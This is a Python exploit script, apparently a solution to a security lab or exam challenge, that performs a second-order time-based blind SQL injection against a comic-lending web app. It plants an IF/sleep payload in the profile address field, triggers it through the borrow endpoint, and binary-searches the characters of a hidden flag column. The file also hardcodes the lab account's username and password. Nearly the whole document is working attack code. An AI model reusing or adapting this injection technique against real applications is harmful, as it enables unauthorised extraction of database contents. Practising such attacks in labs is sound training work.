import string
import time
import urllib.parse
import requests

# ==================== CONFIGURATION ====================
BASE_URL = "https://kobos-087f8634.exam.cyberjutsu-lab.tech/"
USERNAME = "nghiaqt"
PASSWORD = "NghiaNgu_0123"
CHAPTER_ID_TO_BORROW = "2"
SLEEP_TIME = 5
TARGET_COLUMN = "hiddenflag"
TARGET_TABLE = "secretflag"
# =======================================================

s = requests.Session()

def login():
    print("[*] Đang đăng nhập...")
    login_url = f"{BASE_URL}/api/login"
    credentials = {"username": USERNAME, "password": PASSWORD}
    try:
        r = s.post(login_url, json=credentials, timeout=10)
        r.raise_for_status()
        token = r.json().get("token")
        if not token:
            print("[-] Không tìm thấy token.")
            exit(1)
        s.headers.update({"Authorization": f"Bearer {token}"})
        print("[+] Đăng nhập thành công.")
    except requests.exceptions.RequestException as e:
        print(f"[-] Lỗi đăng nhập: {e}")
        exit(1)

def return_chapter():
    return_url = f"{BASE_URL}/api/comics/return"
    return_data = {
        "chapter_id": CHAPTER_ID_TO_BORROW,
        "feedback": "cleanup",
        "rating": 5,
        "platform_feedback": "auto"
    }
    try:
        s.post(return_url, json=return_data, timeout=10)
    except requests.exceptions.RequestException:
        pass

def check_condition(sql_condition):
    payload = f"' OR IF(({sql_condition}), sleep({SLEEP_TIME}), 0), 'abc') -- "
    print(f"[DEBUG] SQL: {sql_condition}")
    encoded_payload = urllib.parse.quote_plus(payload)

    implant_url = f"{BASE_URL}/api/profile/info"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = f"address={encoded_payload}&telephone=123&_method=PUT"
    try:
        s.post(implant_url, headers=headers, data=data, timeout=10)
    except:
        pass

    trigger_url = f"{BASE_URL}/api/comics/borrow"
    start = time.time()
    try:
        s.post(trigger_url, json={"chapter_id": CHAPTER_ID_TO_BORROW}, timeout=SLEEP_TIME+2)
    except requests.exceptions.Timeout:
        return_chapter()
        return True
    end = time.time()

    return_chapter()
    return (end - start) >= SLEEP_TIME

def extract_data(query_template):
    low, high = 1, 100
    while low <= high:
        mid = (low + high) // 2
        condition = query_template.format(f"> {mid}")
        if check_condition(condition):
            low = mid + 1
        else:
            high = mid - 1
    return low

def extract_string(query_template, length):
    result = ""
    for i in range(1, length + 1):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            condition = query_template.format(i=i, char_code=f"<= {mid}")
            if check_condition(condition):
                high = mid - 1
            else:
                low = mid + 1
        char_code = low
        if 32 <= char_code <= 126:
            result += chr(char_code)
        else:
            result += "?"
    print(f"[!] Giá trị trích xuất: {result}")
    return result

if __name__ == "__main__":
    login()
    print("[*] Dọn dẹp trạng thái...")
    return_chapter()

    print("\n--- Bước 1: Lấy độ dài giá trị ---")
    length_query = f"(SELECT LENGTH({TARGET_COLUMN}) FROM {TARGET_TABLE} LIMIT 0,1) {{}}"
    value_length = extract_data(length_query)
    print(f"[+] Độ dài: {value_length}")

    print("\n--- Bước 2: Trích xuất giá trị ---")
    value_query = f"(SELECT ASCII(SUBSTRING({TARGET_COLUMN}, {{i}}, 1)) FROM {TARGET_TABLE} LIMIT 0,1) {{char_code}}"
    value = extract_string(value_query, value_length)

    print("\n================== KẾT QUẢ ==================")
    print(f"{TARGET_COLUMN} = {value}")
    print("=============================================")
